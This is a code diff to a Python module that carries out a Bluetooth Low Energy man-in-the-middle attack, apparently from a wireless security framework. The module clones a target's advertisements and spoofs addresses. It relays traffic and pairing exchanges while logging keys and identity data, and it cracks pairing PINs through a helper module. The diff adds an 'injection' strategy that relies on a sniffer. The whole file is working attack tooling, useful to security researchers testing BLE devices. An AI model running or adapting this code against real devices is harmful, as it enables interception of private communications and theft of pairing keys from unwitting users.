@@ -11,9 +11,15 @@ class BLEMitmStage(IntEnum):
 	STOP = 5
 
 class ble_mitm(module.WirelessModule):
-	def checkCapabilities(self):
-		a2scap = self.a2sEmitter.hasCapabilities("COMMUNICATING_AS_MASTER","INITIATING_CONNECTION","SCANNING")
-		a2mcap = self.a2mEmitter.hasCapabilities("COMMUNICATING_AS_SLAVE","RECEIVING_CONNECTION","ADVERTISING")
+
+	def checkCommunicationCapabilities(self):
+		a2scap = self.a2sEmitter.hasCapabilities("COMMUNICATING_AS_MASTER")
+		a2mcap = self.a2mEmitter.hasCapabilities("COMMUNICATING_AS_SLAVE")
+		return a2scap and a2mcap
+
+	def checkInitiationCapabilities(self):
+		a2scap = self.a2sEmitter.hasCapabilities("INITIATING_CONNECTION","SCANNING")
+		a2mcap = self.a2mEmitter.hasCapabilities("RECEIVING_CONNECTION","ADVERTISING")
 		return a2scap and a2mcap
 
 	def init(self):
@@ -23,16 +29,17 @@ class ble_mitm(module.WirelessModule):
 		self.args = {
 				"INTERFACE1":"hci0", # must allow to change BD Address
 				"INTERFACE2":"hci1",
-				"TARGET":"FC:58:FA:A1:26:6B",
+				"TARGET":"",
 				"CONNECTION_TYPE":"public",
 				"SLAVE_SPOOFING":"yes",
 				"MASTER_SPOOFING":"yes",
-				"ADVERTISING_STRATEGY":"preconnect", # "preconnect" (btlejuice) or "flood" (gattacker)
+				"MITM_STRATEGY":"preconnect", # "preconnect" (btlejuice) or "flood" (gattacker)
 				"SHOW_SCANNING":"yes",
 				"SCENARIO":"",
-				"LTK":""
-				
-			}
+				"LTK":"",
+				"INTERFACE":""
+
+		}
 		self.stage = BLEMitmStage.SCAN
 		# Security Manager related
 		self.pReq = None
@@ -55,6 +62,7 @@ class ble_mitm(module.WirelessModule):
 		self.intervalMax = None
 		self.dataAdvInd = None
 		self.dataScanRsp = None
+
 	# Scenario-related methods
 	@module.scenarioSignal("onStart")
 	def startScenario(self):
@@ -66,6 +74,19 @@ class ble_mitm(module.WirelessModule):
 
 	# Configuration methods
 	def initEmittersAndReceivers(self):
+		if self.args["MITM_STRATEGY"] == "injection" and "butterfly" in self.args["INTERFACE"]:
+			sniffModule = utils.loadModule("ble_sniff")
+			sniffModule["INTERFACE"] = self.args["INTERFACE"]
+			sniffModule["SNIFFING_MODE"] = "newConnections"
+			sniffModule["TARGET"] = self.args["TARGET"]
+			sniffModule["MITMING"] = "yes"
+			output = sniffModule.execute()
+			if not output["success"]:
+				return False
+			else:
+				self.args["INTERFACE1"] = output["output"]["INTERFACE1"]
+				self.args["INTERFACE2"] = output["output"]["INTERFACE2"]
+
 		attackerToSlaveInterface = self.args["INTERFACE1"]
 		attackerToMasterInterface = self.args["INTERFACE2"]
 
@@ -75,10 +96,12 @@ class ble_mitm(module.WirelessModule):
 		self.a2mEmitter = self.getEmitter(interface=attackerToMasterInterface)
 		self.a2mReceiver = self.getReceiver(interface=attackerToMasterInterface)
 
-		if not self.a2mEmitter.isAddressChangeable() and utils.booleanArg(self.args["SLAVE_SPOOFING"]):
-			io.warning("Interface "+attackerToMasterInterface+" is not able to change its address : "
-				   "Address spoofing will not be enabled !")
+		if self.args["MITM_STRATEGY"] != "injection":
+			if not self.a2mEmitter.isAddressChangeable() and utils.booleanArg(self.args["SLAVE_SPOOFING"]):
+				io.warning("Interface "+attackerToMasterInterface+" is not able to change its address : "
+					   "Address spoofing will not be enabled !")
 
+		return True
 
 	# Stage related methods
 	def getStage(self):
@@ -109,16 +132,16 @@ class ble_mitm(module.WirelessModule):
 					self.dataAdvInd = data
 				elif packet.type == "SCAN_RSP":
 					self.dataScanRsp = packet.getRawDatas()
-				
+
 			if self.dataAdvInd is not None and self.dataScanRsp is not None:
 				self.cloneStage(self.address,self.dataAdvInd,self.dataScanRsp,self.intervalMin,self.intervalMax,self.addrType)
 
 	@module.scenarioSignal("onCloning")
 	def cloneStage(self,address,data,dataResponse,intervalMin, intervalMax,addrType):
-		io.info("Entering CLONE stage ...")		
+		io.info("Entering CLONE stage ...")
 		self.setStage(BLEMitmStage.CLONE)
-		
-		if self.args["ADVERTISING_STRATEGY"] == "flood":
+
+		if self.args["MITM_STRATEGY"] == "flood":
 			intervalMin = 200
 			intervalMax = 201
 
@@ -161,7 +184,7 @@ class ble_mitm(module.WirelessModule):
 			self.initiatorAddress = packet.srcAddr
 			self.initiatorAddressType = b"\x00" if packet.type == "public" else b"\x01"
 
-			if self.args["ADVERTISING_STRATEGY"] == "preconnect":
+			if self.args["MITM_STRATEGY"] == "preconnect":
 				if utils.booleanArg(self.args["MASTER_SPOOFING"]):
 					self.a2sEmitter.sendp(ble.BLEDisconnect())
 					while self.a2sEmitter.isConnected():
@@ -178,10 +201,10 @@ class ble_mitm(module.WirelessModule):
 							)
 					while not self.a2sEmitter.isConnected():
 						utils.wait(seconds=0.01)
-			if self.args["ADVERTISING_STRATEGY"] == "flood":
+			if self.args["MITM_STRATEGY"] == "flood":
 				if utils.booleanArg(self.args["MASTER_SPOOFING"]):
 					self.a2sEmitter.setAddress(packet.srcAddr,random=packet.type == "random")
-				self.connectOnSlave(packet.type)
+				#self.connectOnSlave(packet.type)
 			self.setStage(BLEMitmStage.ACTIVE_MITM)
 			io.info("Entering ACTIVE_MITM stage ...")
 
@@ -195,7 +218,7 @@ class ble_mitm(module.WirelessModule):
 	@module.scenarioSignal("onSlaveDisconnect")
 	def disconnectSlave(self,packet):
 		io.info("Slave disconnected !")
-	
+
 
 	@module.scenarioSignal("onMasterExchangeMTURequest")
 	def exchangeMtuRequest(self,packet):
@@ -210,7 +233,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Exchange MTU Response (from slave) : mtu = "+str(packet.mtu))
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEExchangeMTUResponse(mtu=packet.mtu))
-	
+
 	@module.scenarioSignal("onMasterWriteCommand")
 	def writeCommand(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
@@ -268,7 +291,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEErrorResponse(request=packet.request,handle=packet.handle,ecode=packet.ecode))
 
-	@module.scenarioSignal("onSlaveHandleValueNotification")	
+	@module.scenarioSignal("onSlaveHandleValueNotification")
 	def notification(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Handle Value Notification (from slave) : handle = "+hex(packet.handle)+
@@ -276,7 +299,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle,value=packet.value))
 
-	@module.scenarioSignal("onSlaveHandleValueIndication")	
+	@module.scenarioSignal("onSlaveHandleValueIndication")
 	def indication(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Handle Value Indication (from slave) : handle = "+hex(packet.handle)+
@@ -380,16 +403,16 @@ class ble_mitm(module.WirelessModule):
 	def pairingRequest(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info(("Pairing Request (from master) : " +
-			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") + 
+			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") +
 			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
-			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) + 
-			"\n=> maxKeySize = "+ str(packet.maxKeySize) + 
+			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) +
+			"\n=> maxKeySize = "+ str(packet.maxKeySize) +
 			"\n=> initiatorKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
 			"\n=> responderKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
-			 
+
 			io.info ("Storing Pairing Request's payload :"+packet.payload.hex())
 			self.pReq = packet.payload[::-1]
-			
+
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEPairingRequest(
 									outOfBand=packet.outOfBand,
@@ -404,11 +427,11 @@ class ble_mitm(module.WirelessModule):
 	@module.scenarioSignal("onSlavePairingResponse")
 	def pairingResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
-			io.info(("Pairing Response (from slave) : " + 
-			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") + 
+			io.info(("Pairing Response (from slave) : " +
+			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") +
 			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
-			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) + 
-			"\n=> maxKeySize = "+ str(packet.maxKeySize) + 
+			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) +
+			"\n=> maxKeySize = "+ str(packet.maxKeySize) +
 			"\n=> initiatorKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
 			"\n=> responderKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
 			io.info ("Storing Pairing Response's payload :"+packet.payload.hex())
@@ -446,7 +469,7 @@ class ble_mitm(module.WirelessModule):
 
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEPairingConfirm(confirm=packet.confirm))
-						
+
 	@module.scenarioSignal("onMasterPairingRandom")
 	def masterPairingRandom(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
@@ -462,7 +485,7 @@ class ble_mitm(module.WirelessModule):
 			m["RESPONDER_ADDRESS_TYPE"] = "public" if self.responderAddressType == b"\x00" else "random"
 			m["RESPONDER_ADDRESS"] = self.responderAddress
 			m["MASTER_CONFIRM"] = self.mConfirm.hex()
-			
+
 			output = m.run()
 			if output["success"]:
 				self.pin = int(output["output"]["PIN"])
@@ -481,9 +504,6 @@ class ble_mitm(module.WirelessModule):
 			io.info("Storing sRand : "+packet.random.hex())
 			self.sRand = packet.random[::-1]
 			io.info("Redirecting to master ...")
-			#newRandom = ble.BLECrypto.c1m1(self.temporaryKey,self.sConfirm,self.pReq,self.pRes,self.initiatorAddressType,self.initiatorAddress,self.responderAddressType,self.responderAddress)
-			#self.forgedsRand = newRandom
-			#io.info("Using fake random : "+newRandom.hex())
 			self.a2mEmitter.sendp(ble.BLEPairingRandom(random=packet.random))
 
 
@@ -527,7 +547,7 @@ class ble_mitm(module.WirelessModule):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Failed (from master) !")
 			self.pairingFailed(pkt)
-			
+
 	@module.scenarioSignal("onSlavePairingFailed")
 	def slavePairingFailed(self,pkt):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
@@ -543,25 +563,25 @@ class ble_mitm(module.WirelessModule):
 	@module.scenarioSignal("onSlaveMasterIdentification")
 	def slaveMasterIdentification(self,packet):
 		io.info("Master Indentification (from slave) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
-		io.info("Redirecting to master ...")		
-		self.a2mEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		
+		io.info("Redirecting to master ...")
+		self.a2mEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))
 
 	@module.scenarioSignal("onSlaveIdentityAddressInformation")
 	def slaveIdentityAddressInformation(self,packet):
 		io.info("Identity Address Information (from slave) : address = "+str(packet.address)+" / type = "+packet.type)
-		io.info("Redirecting to master ...")		
+		io.info("Redirecting to master ...")
 		self.a2mEmitter.sendp(ble.BLEIdentityAddressInformation(address=packet.address,type=packet.type))
 
 	@module.scenarioSignal("onSlaveIdentityInformation")
 	def slaveIdentityInformation(self,packet):
 		io.info("Identity Information (from slave) : irk = "+packet.irk.hex())
-		io.info("Redirecting to master ...")		
+		io.info("Redirecting to master ...")
 		self.a2mEmitter.sendp(ble.BLEIdentityInformation(irk=packet.irk))
 
 	@module.scenarioSignal("onSlaveSigningInformation")
 	def slaveSigningInformation(self,packet):
 		io.info("Signing Information (from slave) : csrk = "+packet.csrk.hex())
-		io.info("Redirecting to master ...")		
+		io.info("Redirecting to master ...")
 		self.a2mEmitter.sendp(ble.BLESigningInformation(csrk=packet.csrk))
 
 
@@ -574,25 +594,25 @@ class ble_mitm(module.WirelessModule):
 	@module.scenarioSignal("onMasterMasterIdentification")
 	def masterMasterIdentification(self,packet):
 		io.info("Master Indentification (from master) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
-		io.info("Redirecting to slave ...")		
-		self.a2sEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		
+		io.info("Redirecting to slave ...")
+		self.a2sEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))
 
 	@module.scenarioSignal("onMasterIdentityAddressInformation")
 	def masterIdentityAddressInformation(self,packet):
 		io.info("Identity Address Information (from master) : address = "+str(packet.address)+" / type = "+packet.type)
-		io.info("Redirecting to slave ...")		
+		io.info("Redirecting to slave ...")
 		self.a2sEmitter.sendp(ble.BLEIdentityAddressInformation(address=packet.address,type=packet.type))
 
 	@module.scenarioSignal("onMasterIdentityInformation")
 	def masterIdentityInformation(self,packet):
 		io.info("Identity Information (from master) : irk = "+packet.irk.hex())
-		io.info("Redirecting to slave ...")		
+		io.info("Redirecting to slave ...")
 		self.a2sEmitter.sendp(ble.BLEIdentityInformation(irk=packet.irk))
 
 	@module.scenarioSignal("onMasterSigningInformation")
 	def masterSigningInformation(self,packet):
 		io.info("Signing Information (from master) : csrk = "+packet.csrk.hex())
-		io.info("Redirecting to slave ...")		
+		io.info("Redirecting to slave ...")
 		self.a2sEmitter.sendp(ble.BLESigningInformation(csrk=packet.csrk))
 
 
@@ -609,21 +629,16 @@ class ble_mitm(module.WirelessModule):
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEConnectionParameterUpdateRequest(
 						l2capCmdId = packet.l2capCmdId,timeoutMult=packet.timeoutMult, slaveLatency=packet.slaveLatency, minInterval=packet.minInterval, maxInterval=packet.maxInterval))
-	
-			
+
+
 	@module.scenarioSignal("onMasterConnectionParameterUpdateResponse")
 	def connectionParameterUpdateResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Connection Parameter Update Response (from master) : moveResult = "+str(packet.moveResult))
-			'''
-			io.info("Sending a response to master ...")
-			if packet.moveResult == 0:
-				self.a2sEmitter.updateConnectionParameters()	
-			'''	
 
 	def checkParametersValidity(self):
-		if self.args["ADVERTISING_STRATEGY"] not in ("preconnect","flood"):
-			io.fail("You have to select a valid strategy : 'flood' or 'preconnect'")
+		if self.args["MITM_STRATEGY"] not in ("preconnect","flood","injection"):
+			io.fail("You have to select a valid strategy : 'flood', 'preconnect' or 'injection'")
 			return self.nok()
 		return None
 
@@ -632,36 +647,38 @@ class ble_mitm(module.WirelessModule):
 		validity = self.checkParametersValidity()
 		if validity is not None:
 			return validity
-		
-		self.initEmittersAndReceivers()
-		if self.checkCapabilities():
+		success = self.initEmittersAndReceivers()
+		if not success:
+			return self.nok()
+		if self.checkCommunicationCapabilities():
 			if self.loadScenario():
 				io.info("Scenario loaded !")
 				self.startScenario()
-			
 
-			# Advertising Callbacks
-			self.a2sReceiver.onEvent("BLEAdvertisement",callback=self.scanStage)
+			if self.checkInitiationCapabilities():
+				# Advertising Callbacks
+				self.a2sReceiver.onEvent("BLEAdvertisement",callback=self.scanStage)
 
-			io.info("Entering SCAN stage ...")
-			self.setStage(BLEMitmStage.SCAN)
+				io.info("Entering SCAN stage ...")
+				self.setStage(BLEMitmStage.SCAN)
 
-			self.a2sReceiver.setScan(enable=True)
+				self.a2sReceiver.setScan(enable=True)
 
-			self.waitUntilStage(BLEMitmStage.CLONE)
+				self.waitUntilStage(BLEMitmStage.CLONE)
 
-			self.a2sReceiver.setScan(enable=False)
-			self.a2sReceiver.removeCallbacks()
-			if self.args["ADVERTISING_STRATEGY"] == "preconnect":
-				self.connectOnSlave()
+				self.a2sReceiver.setScan(enable=False)
+				self.a2sReceiver.removeCallbacks()
+				if self.args["MITM_STRATEGY"] == "preconnect":
+					self.connectOnSlave()
 
-			self.a2mEmitter.setAdvertising(enable=True)
-			io.info("Entering WAIT_CONNECTION stage ...")		
-			self.setStage(BLEMitmStage.WAIT_CONNECTION)
-			# Connect Callbacks
-			self.a2mReceiver.onEvent("BLEConnectResponse",callback=self.connect)
-
-			# Disconnect Callbacks
+				self.a2mEmitter.setAdvertising(enable=True)
+				io.info("Entering WAIT_CONNECTION stage ...")
+				self.setStage(BLEMitmStage.WAIT_CONNECTION)
+				# Connect Callbacks
+				self.a2mReceiver.onEvent("BLEConnectResponse",callback=self.connect)
+			elif self.args["MITM_STRATEGY"] == "injection":
+				# Maybe the MITM is already established using an injection strategy
+				self.setStage(BLEMitmStage.ACTIVE_MITM)
 			self.a2mReceiver.onEvent("BLEDisconnect",callback=self.disconnectMaster)
 			self.a2sReceiver.onEvent("BLEDisconnect",callback=self.disconnectSlave)
 
@@ -697,14 +714,14 @@ class ble_mitm(module.WirelessModule):
 			self.a2mReceiver.onEvent("BLEReadByGroupTypeRequest",callback=self.readByGroupType)
 			self.a2sReceiver.onEvent("BLEReadByTypeResponse",callback=self.readByTypeResponse)
 			self.a2sReceiver.onEvent("BLEReadByGroupTypeResponse", callback=self.readByGroupTypeResponse)
-			
+
 			# MTU Callbacks
 			self.a2mReceiver.onEvent("BLEExchangeMTURequest",callback=self.exchangeMtuRequest)
 			self.a2sReceiver.onEvent("BLEExchangeMTUResponse",callback=self.exchangeMtuResponse)
 
 			# Connection Parameter Update Callbacks
 			self.a2sReceiver.onEvent("BLEConnectionParameterUpdateRequest",
-							callback=self.connectionParameterUpdateRequest)			
+							callback=self.connectionParameterUpdateRequest)
 			self.a2mReceiver.onEvent("BLEConnectionParameterUpdateResponse",
 							callback=self.connectionParameterUpdateResponse)
 
@@ -725,7 +742,7 @@ class ble_mitm(module.WirelessModule):
 			self.a2sReceiver.onEvent("BLEIdentityInformation",callback=self.slaveIdentityInformation)
 			self.a2sReceiver.onEvent("BLEIdentityAddressInformation",callback=self.slaveIdentityAddressInformation)
 			self.a2sReceiver.onEvent("BLESigningInformation",callback=self.slaveSigningInformation)
-									
+
 
 			self.a2mReceiver.onEvent("BLEEncryptionInformation",callback=self.masterEncryptionInformation)
 			self.a2mReceiver.onEvent("BLEMasterIdentification",callback=self.masterMasterIdentification)
@@ -733,10 +750,14 @@ class ble_mitm(module.WirelessModule):
 			self.a2mReceiver.onEvent("BLEIdentityAddressInformation",callback=self.masterIdentityAddressInformation)
 			self.a2mReceiver.onEvent("BLESigningInformation",callback=self.masterSigningInformation)
 
-			self.waitUntilStage(BLEMitmStage.STOP)
+			if self.args["MITM_STRATEGY"] == "injection":
+				while self.a2mReceiver.isConnected():
+					utils.wait(seconds=0.01)
+			else:
+				self.waitUntilStage(BLEMitmStage.STOP)
 			if self.scenarioEnabled:
 				self.endScenario()
 			return self.ok()
 		else:
-			io.fail("Interfaces provided ("+str(self.args["INTERFACE"])+") are not able to run this module.")
+			io.fail("Interfaces provided ("+str(self.args["INTERFACE1"])+", "+str(self.args["INTERFACE2"])+") are not able to run this module.")
 			return self.nok()
